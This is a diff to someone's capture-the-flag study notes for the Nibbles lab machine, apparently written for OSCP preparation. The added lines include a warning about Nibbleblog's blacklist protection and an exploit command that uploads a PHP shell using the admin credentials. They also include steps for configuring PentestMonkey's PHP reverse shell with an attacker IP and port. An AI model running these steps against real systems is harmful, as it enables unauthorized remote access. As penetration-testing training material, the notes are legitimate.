@@ -163,6 +163,10 @@ compare it to this version, which reveals a lot more, including the /admin.php l
 
 ![[Screenshot 2026-01-13 at 3.15.45 PM.png|300]]
 
+**Caution:** trying "forget password" will trigger Nibble blacklist protection
+![[nibble-blacklist-protection.png|300]]
+
+
 ![[Screenshot 2026-01-13 at 2.56.44 PM.png|300]]
 
 ![[Screenshot 2026-01-13 at 2.57.30 PM.png|300]]
@@ -176,3 +180,22 @@ https://www.exploit-db.com/exploits/38489
 
 During OSCP exams, you can only use metasploit once, hence use it only as last resort. 
 
+
+
+
+
+
+python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php
+
+
+Kali Linux comes pre-installed with the most famous PHP reverse shell (created by PentestMonkey).
+
+Copy it to current working directory:
+```
+cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
+```
+
+nano shell.php to include our kali machine IP & listening port
+
+$ip = '127.0.0.1';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
